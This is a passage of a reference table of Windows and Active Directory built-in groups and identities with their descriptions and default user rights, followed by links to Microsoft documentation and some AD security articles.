Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
<tr>
  <td>RAS and IAS Servers</td>
  <td>&nbsp;</td>
<td>&nbsp;</td>
  <td>Servers in this group are permitted access to the remote access properties of users. A domain local group . By default, this group 
      has no members. Computers that are running the Routing and Remote Access 
      service are added to the group automatically. Members of this group have 
      access to certain properties of User objects, such as Read Account Restrictions, 
    Read Logon Information, and Read Remote Access Information. Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
  <tr>
<td>RDS Endpoint Servers</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Servers that are members in the RDS Endpoint Servers group can run virtual machines and host sessions where user RemoteApp programs and personal virtual desktops run. This group needs to be populated on servers running RD Connection Broker. Session Host servers and RD Virtualization Host servers used in the deployment need to be in this group.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
<tr>
<td>RDS Management Servers</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Servers that are members in the RDS Management Servers group can be used to perform routine administrative actions on servers running Remote Desktop Services. This group needs to be populated on all servers in a Remote Desktop Services deployment. The servers running the RDS Central Management service must be included in this group. Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
<tr>
<td>RDS Remote Access Servers</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Servers in the RDS Remote Access Servers group provide users with access to RemoteApp programs and personal virtual desktops. In Internet facing deployments, these servers are typically deployed in an edge network. This group needs to be populated on servers running RD Connection Broker. RD Gateway servers and RD Web Access servers that are used in the deployment need to be in this group. Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
<tr>
  <td>Read-Only Domain Controllers</td>
  <td>&nbsp;</td>
<td>&nbsp;</td>
  <td>This group is comprised of the Read-only domain controllers in the domain. A Read-only domain controller makes it possible for organizations to easily deploy a domain controller in scenarios where physical security cannot be guaranteed, such as branch office locations, or in scenarios where local storage of all domain passwords is considered a primary threat, such as in an extranet or in an application-facing role. Default User Rights   See 'Denied RODC Password Replication Group'.</td>
</tr>
  <tr>
<td>Remote Desktop Users</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>The Remote Desktop Users group on an RD Session Host server is used to grant users and groups permissions to remotely connect to an RD Session Host server. This group cannot be renamed, deleted, or moved. It appears as a SID until the domain controller is made the primary domain controller and it holds the operations master role (also known as flexible single master operations or FSMO).<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
<tr>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Remote Interactive Logon</td>
<td>This identity represents all users who are currently logged on to a computer by using a Remote Desktop connection. This group is a subset of the Interactive group. Access tokens that contain the Remote Interactive Logon SID also contain the Interactive SID.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
<tr>
<td>Remote Management Users</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Members of the Remote Management Users group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user. The Remote Management Users group is generally used to allow users to manage servers through the Server Manager console, whereas the WinRMRemoteWMIUsers_ group is allows remotely running Windows PowerShell commands.<br>
Default User Rights: <span class="code">None</span></td>
</tr>
<tr>
  <td>Replicator</td>
  <td>&nbsp;</td>
<td>&nbsp;</td>
  <td><p>Computers that are members of the Replicator group support file replication in a domain. Windows Server operating systems use the File Replication service (FRS) to replicate system policies and logon scripts stored in the System Volume (SYSVOL).</p>
<p>The DFS Replication service is a replacement for FRS, and it can be used to replicate the contents of a SYSVOL shared resource, DFS folders, and other custom (non-SYSVOL) data. You should migrate all non-SYSVOL FRS replica sets to DFS Replication.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></p></td>
</tr>
  <tr>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Restricted</td>
<td>Users and computers with restricted capabilities have the Restricted identity. This identity group is used by a process that is running in a restricted security context, such as running an application with the RunAs service. When code runs at the Restricted security level, the Restricted SID is added to the user’s access token.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
<tr>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>SChannel Authentication</td>
<td>Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
<tr>
  <td>Schema Admins</td>
  <td>&nbsp;</td>
<td>&nbsp;</td>
  <td>A group that exists only in the root domain 
      of an Active Directory forest of domains. It is a universal group if the 
      domain is in native mode , a global group if the domain is in mixed mode 
      . The group is authorized to make schema&nbsp; changes in Active Directory. 
      By default, the only member of the group is the Administrator account for 
      the forest root domain. Because this group has significant power in the forest, add users with caution.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>:   See 'Denied RODC Password Replication Group'.</td>
</tr>
  <tr>
    <td>Server Operators</td>
    <td>&nbsp;</td>
<td>&nbsp;</td>
    <td>A built-in group that exists only on domain 
      controllers. By default, the group has no members. Server Operators can 
      log on to a server interactively; create and delete network shares; start 
      and stop services; back up and restore files; format the hard disk of the 
      computer; and shut down the computer.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>:<br>
Allow log on locally: <span class="code">SeInteractiveLogonRight</span><br>
Back up files and directories: <span class="code">SeBackupPrivilege</span><br>
Change the system time: <span class="code">SeSystemTimePrivilege</span><br>
Change the time zone: <span class="code">SeTimeZonePrivilege</span><br>
Force shutdown from a remote system: <span class="code">SeRemoteShutdownPrivilege</span><br>
Restore files and directories <span class="code">SeRestorePrivilege</span><br>
Shut down the system: <span class="code">SeShutdownPrivilege</span></td>
  </tr>
  <tr>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
<td>Service </td>
    <td><p>Any service that accesses the system has the Service identity. This identity group includes all security principals that are signed in as a service. This identity grants access to processes that are being run by Windows Server services. Membership is controlled by the operating system. <br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>:<br>
Create global objects: <span class="code">SeCreateGlobalPrivilege</span><br>
Impersonate a client after authentication: <span class="code">SeImpersonatePrivilege</span></p></td>
  </tr>
  <tr>
<td>Storage Replica Administrators</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Members of this group have complete and unrestricted access to all features of Storage Replica.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
<tr>
<td>System Managed Accounts Group</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Members of this group are managed by the system.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
<tr>
<td>Terminal Server License Servers</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Members of the Terminal Server License Servers group can update user accounts in Active Directory with information about license issuance. This is used to track and report TS Per User CAL usage. A TS Per User CAL gives one user the right to access a Terminal Server from an unlimited number of client computers or devices. This group appears as a SID until the domain controller is made the primary domain controller and it holds the operations master role (also known as flexible single master operations or FSMO).<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
<tr>
  <td>&nbsp;</td>
  <td>&nbsp;</td>
<td>Terminal Server Users </td>
  <td>Any user accessing the system through Terminal Services has the Terminal Server User identity. This identity allows users to access Terminal Server applications and to perform other necessary tasks with Terminal Server services. Membership is controlled by the operating system.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
  <tr>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>This Organization</td>
<td>Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
<tr>
  <td>Users</td>
  <td>&nbsp;</td>
<td>&nbsp;</td>
  <td>A built-in group. After the initial installation 
      of the operating system, the only member is the Authenticated Users group. 
      When a computer joins a domain, the Domain Users group is added to the Users 
      group on the computer. Users can perform tasks such as running applications, 
      using local and network printers, shutting down the computer, and locking 
      the computer. Users can install applications that only they are allowed 
      to use if the installation program of the application supports per-user 
      installation.<br>
This group cannot be renamed, deleted, or moved. <br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
<tr>
<td>Windows Authorization Access Group</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Members of this group have access to the computed token GroupsGlobalAndUniversal attribute on User objects. Some applications have features that read the token-groups-global-and-universal (TGGAU) attribute on user account objects or on computer account objects in Active Directory Domain Services. <br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
<tr>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Window Manager\Window Manager Group</td>
<td>Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>:<br>
Bypass traverse checking: <span class="code">SeChangeNotifyPrivilege</span><br>
Increase a process working set: <span class="code">SeIncreaseWorkingSetPrivilege</span></td>
</tr>
<tr>
<td>WinRMRemoteWMIUsers_</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td><p>In Windows 8 and in Windows Server 2012, a Share tab was added to the Advanced Security Settings user interface. This tab displays the security properties of a remote file share. To view this information, you must have the following permissions and memberships, as appropriate for the version of Windows Server that the file server is running.</p>
<p>The WinRMRemoteWMIUsers_ group allows running  PowerShell commands remotely whereas the 'Remote Management Users' group is generally used to allow users to manage servers by using the Server Manager console. This security group was introduced in Windows Server 2012.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></p></td>
</tr>
</table>

![](ss64-windowsgroups-default-admin-users-and-groups.png)

How-to: [Understand the different types of Active Directory group](https://ss64.com/nt/syntax-groups.html), Local Domain, Global and Universal.  
[Q271876](https://web.archive.org/web/20120327173217/https://support.microsoft.com/kb/271876) - Large Numbers of ACEs in ACLs Impair Directory Service Performance.  
[Q243330](https://support.microsoft.com/en-us/help/243330/) - Well-known security identifiers (sids) in Windows operating systems.  
[Q277752](https://web.archive.org/web/20090221162529/https://support.microsoft.com/kb/277752) - Security Identifiers for built-in groups are unresolved when modifying group policy.  
[AdminSdHolder FAQ](https://docs.microsoft.com/en-gb/archive/blogs/askds/five-common-questions-about-adminsdholder-and-sdprop) - High-privilege accounts (Admins and Account Operators) are [protected](https://specopssoft.com/blog/troubleshooting-user-account-permissions-adminsdholder/) from inadvertent modification.  
[Active Directory Security Groups](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups) - docs.microsoft.com

## References

[Backup Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-backupoperators) 
[Event Log Readers](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-eventlogreaders)
[DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-dnsadmins)
[Hyper-V Administrators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-hypervadministrators)
[Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-printoperators)
[Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators)
[HTB academy](https://academy.hackthebox.com)
[Understand the different types of Active Directory group](https://ss64.com/nt/syntax-groups.html)
[Q271876](https://web.archive.org/web/20120327173217/https://support.microsoft.com/kb/271876) 
[Q243330](https://support.microsoft.com/en-us/help/243330/) 
[Q277752](https://web.archive.org/web/20090221162529/https://support.microsoft.com/kb/277752) 
[AdminSdHolder FAQ](https://docs.microsoft.com/en-gb/archive/blogs/askds/five-common-questions-about-adminsdholder-and-sdprop) 
[protected](https://specopssoft.com/blog/troubleshooting-user-account-permissions-adminsdholder/) 
[Active Directory Security Groups](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups)
[ss64 Security Groups Table](https://ss64.com/nt/syntax-security_groups.html)
[dnscmd](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd)
[adsecurity DNSAdmin to Domain Admin article](https://adsecurity.org/?p=4064) 
[Security Descriptor Definition Lanaguage](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language) 
[How to view and modify permissions in Windows](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/)
[disable global query block security](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps)